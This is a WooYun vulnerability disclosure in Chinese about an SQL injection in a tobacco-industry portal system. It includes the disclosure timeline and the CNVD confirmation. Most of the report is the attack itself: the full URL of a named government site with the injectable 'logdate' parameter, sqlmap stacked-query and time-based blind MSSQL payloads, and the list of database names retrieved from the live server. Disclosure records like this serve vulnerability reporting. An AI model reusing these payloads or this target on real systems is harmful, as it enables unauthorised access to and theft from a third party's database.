wybug_title: 某烟草行业通用系统注入
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-04-20：	细节已通知厂商并且等待厂商处理中									2015-04-24：	厂商已经确认，细节仅向厂商公开									2015-04-27：	细节向第三方安全合作伙伴开放									2015-06-18：	细节向核心白帽子及相关领域专家公开									2015-06-28：	细节向普通白帽子公开									2015-07-08：	细节向实习白帽子公开									2015-07-23：	细节向公众公开  简要描述： 无意间看到的 详细说明：  无聊逛了一圈，发现此系统还存在注入漏洞
http://wooyun.org/bugs/wooyun-2014-087785

http://www.rzdonggang.gov.cn/ycportal/jsp/log/logdelete.jsp?logdate=2005-11-01

Place: GETParameter: logdate    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: logdate=2005-11-01'); WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: logdate=2005-11-01') WAITFOR DELAY '0:0:5'-----[11:26:39] [INFO] testing Microsoft SQL Server[11:26:39] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y[11:26:48] [INFO] confirming Microsoft SQL Server[11:26:54] [INFO] the back-end DBMS is Microsoft SQL Serverweb application technology: JSPback-end DBMS: Microsoft SQL Server 2000[11:26:54] [INFO] fetching database names[11:26:54] [INFO] fetching number of databases[11:26:54] [INFO] retrieved: [11:26:59] [INFO] adjusting time delay to 1 second due to good response times8[11:27:02] [INFO] retrieved: ArticleTotal[11:28:06] [INFO] retrieved: master[11:28:38] [INFO] retrieved: model[11:29:08] [INFO] retrieved: msdb[11:29:30] [INFO] retrieved: Northwind[11:30:24] [INFO] retrieved: pubs[11:30:49] [INFO] retrieved: tempdb[11:31:24] [INFO] retrieved: ycportal

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-04-24 10:36 厂商回复： CNVD确认所述情况，已经由CNVD通过网站公开联系方式向软件生产厂商及各分中心通报。 最新状态： 暂无
